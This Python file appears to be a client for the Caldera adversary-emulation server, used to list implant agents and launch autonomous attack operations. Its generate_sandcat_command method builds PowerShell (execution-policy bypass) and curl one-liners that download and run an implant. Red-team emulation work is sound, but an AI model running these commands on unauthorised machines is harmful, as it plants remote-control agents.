
import os
import logging
from typing import Any

import requests
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

class CalderaAPIError(Exception):
    """Raised when Caldera API returns an error or cannot be reached."""
    pass
class CalderaClient:
    def __init__(self, base_url=None, api_key=None, verify_ssl=False, timeout=10):
        self.base_url = (base_url or os.getenv("CALDERA_URL", "http://127.0.0.1:8888")).rstrip("/")
        self.api_key = api_key or os.getenv("CALDERA_API_KEY", "")
        self.verify_ssl = verify_ssl
        self.timeout = timeout

        self.session = requests.Session()
        if self.api_key:
            self.session.headers.update({
                "KEY": self.api_key,
                "Content-Type": "application/json"
            })

    def _request(self, method, endpoint, **kwargs):
        url = f"{self.base_url}{endpoint}"

        try:
            response = self.session.request(
                method,
                url,
                timeout=self.timeout,
                verify=self.verify_ssl,
                **kwargs
            )
            response.raise_for_status()

            if response.text:
                return response.json()

            return {}

        except requests.exceptions.RequestException as e:
            raise CalderaAPIError(f"Caldera API request failed: {e}")

        except ValueError:
            raise CalderaAPIError("Caldera returned a non-JSON response.")

    def health_check(self):
        """
        Checks whether the Caldera server is reachable.

        Note:
        Some Caldera versions may not expose /api/v2/health.
        If this endpoint fails, use list_agents() as the practical connectivity test.
        """
        return self._request("GET", "/api/v2/health")

    def list_agents(self):
        return self._request("GET", "/api/v2/agents")

    def _normalise_bool(self, value):
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            return value.strip().lower() in {"true", "trusted", "yes", "1"}
        return bool(value)

    def _agent_is_alive(self, agent):
        raw = agent.get("alive")
        if raw is not None:
            return self._normalise_bool(raw)
        status = str(agent.get("status") or agent.get("state") or "").lower()
        if status in {"dead", "offline", "untrusted"}:
            return False
        if status in {"alive", "online", "trusted", "running"}:
            return True
        return True

    def _normalise_agent(self, agent):
        trusted = self._normalise_bool(agent.get("trusted"))
        host = agent.get("host") or agent.get("host_name") or agent.get("hostname") or "unknown"
        last_seen = agent.get("last_seen") or agent.get("last_seen_time") or agent.get("last_seen_at")
        ip = (
            agent.get("host_ip_addrs")
            or agent.get("host_ip")
            or agent.get("ip")
            or agent.get("address")
            or ""
        )
        if isinstance(ip, list):
            ip = ", ".join(str(item) for item in ip if item)

        return {
            "paw": agent.get("paw"),
            "host": host,
            "hostname": host,
            "ip": ip,
            "platform": agent.get("platform") or agent.get("os") or agent.get("architecture") or "unknown",
            "group": agent.get("group"),
            "last_seen": last_seen,
            "trusted": trusted,
            "alive": self._agent_is_alive(agent),
            "status": "Online" if self._agent_is_alive(agent) else "Offline",
        }

    def get_agents_normalized(self):
        agents = self.list_agents()

        if isinstance(agents, dict):
            agents = agents.get("agents", [])

        return [self._normalise_agent(agent) for agent in agents or []]

    def get_online_agents(self):
        return [
            agent
            for agent in self.get_agents_normalized()
            if agent.get("trusted") and agent.get("alive") and agent.get("paw")
        ]

    def list_operations(self):
        return self._request("GET", "/api/v2/operations")
    def get_abilities(self):
        return self._request("GET", "/api/v2/abilities")


    def create_adversary(self, name, ability_ids):
        payload = {
        "name": name,
        "description": "Auto-generated adversary profile",
        "atomic_ordering": ability_ids
        }
        return self._request("POST", "/api/v2/adversaries", json=payload)


    def delete_adversary(self, adversary_id):
        return self._request("DELETE", f"/api/v2/adversaries/{adversary_id}")


    def get_adversary_by_name(self, name):
        adversaries = self._request("GET", "/api/v2/adversaries")

        if isinstance(adversaries, dict):
            adversaries = adversaries.get("adversaries", [])

        for adv in adversaries:
            if adv.get("name", "").lower() == name.lower():
                return adv

        return None


    def get_operation_links(self, operation_id):
        return self._request("GET", f"/api/v2/operations/{operation_id}/links")


    def stop_operation(self, operation_id):
        payload = {"state": "finished"}
        return self._request("PATCH", f"/api/v2/operations/{operation_id}", json=payload)
    
    def get_operation(self, operation_id):
        return self._request("GET", f"/api/v2/operations/{operation_id}")

    def create_operation(self, name, adversary_id, group="red", planner_id=None):
        payload = {
            "name": name,
            "group": group,
            "adversary": {
                "adversary_id": adversary_id
            },
            "state": "running",
            "autonomous": 1
        }

        if planner_id:
            payload["planner"] = {
                "planner_id": planner_id
            }

        return self._request("POST", "/api/v2/operations", json=payload)
    
    def get_abilities_by_technique(self, technique_id):
        abilities = self.get_abilities()

        if isinstance(abilities, dict):
            abilities = abilities.get("abilities", [])

        matches = []

        for ability in abilities:
            attack = ability.get("technique_id") or ability.get("technique", {})

            if isinstance(attack, dict):
                tid = attack.get("attack_id")
            else:
                tid = attack

            if tid == technique_id:
                matches.append(ability)

        return matches

    # Compatibility aliases / helpers for older test scripts and callers
    def ping(self):
        """Backward-compatible ping method used by tests.
        Returns True if Caldera appears reachable, False otherwise.
        """
        try:
            # Prefer the health endpoint when available
            self.health_check()
            return True
        except CalderaAPIError:
            try:
                # Fallback to listing agents as a pragmatic connectivity check
                self.list_agents()
                return True
            except CalderaAPIError:
                return False

    def get_agents(self):
        """Alias for list_agents() returning a list of agents."""
        agents = self.list_agents()
        if isinstance(agents, dict):
            return agents.get("agents", [])
        return agents

    def get_adversaries(self):
        """Return list of adversaries."""
        adv = self._request("GET", "/api/v2/adversaries")
        if isinstance(adv, dict):
            return adv.get("adversaries", [])
        return adv

    def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
        """Return a simple deploy command string for Sandcat (informational).
        This is a best-effort helper and intentionally non-destructive.
        """
        server = kali_ip or self.base_url
        key_part = f" -k {self.api_key}" if self.api_key else ""

        if "win" in str(platform or "").lower():
            return (
                "powershell -ExecutionPolicy Bypass -NoProfile -Command "
                f"\"iwr -UseBasicParsing {self.base_url}/file/download -OutFile sandcat.exe; "
                f".\\sandcat.exe -server {server} -group {group}{key_part}\""
            )

        return (
            f"curl -fsSL {self.base_url}/file/download -o sandcat; "
            f"chmod +x sandcat; ./sandcat -server {server} -group {group}{key_part}"
        )

    def get_adversary_list(self):
        """Alias for get_adversaries() - backwards compatibility."""
        return self.get_adversaries()
